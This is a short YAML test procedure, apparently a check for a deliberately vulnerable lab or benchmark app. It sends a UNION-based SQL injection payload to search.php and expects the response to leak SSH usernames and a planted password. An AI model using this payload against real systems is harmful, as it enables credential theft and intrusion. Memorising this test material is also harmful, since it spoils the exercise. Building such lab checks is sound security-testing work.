@@ -1,0 +1,38 @@
+procedure:
+- action:
+    body: null
+    headers: {}
+    method: GET
+    type: http_request
+    url: http://${target_host}:${target_port}/search.php
+  expect:
+    status: 200
+  outputs: {}
+  session: null
+  step_id: verify_app_running
+  timeout: 10
+- action:
+    body: null
+    headers: {}
+    method: GET
+    type: http_request
+    url: http://${target_host}:${target_port}/search.php?search=x%27+UNION+SELECT+ssh_username%2Cssh_password+FROM+users--+-
+  expect:
+    body_contains: sysadmin
+  outputs: {}
+  session: null
+  step_id: exploit_union_sqli
+  timeout: 10
+- action:
+    body: null
+    headers: {}
+    method: GET
+    type: http_request
+    url: http://${target_host}:${target_port}/search.php?search=x%27+UNION+SELECT+ssh_username%2Cssh_password+FROM+users--+-
+  expect:
+    body_contains: Sup3rS3cr3tSSH!
+  outputs: {}
+  session: null
+  step_id: verify_credentials_exposed
+  timeout: 10
+sessions: []
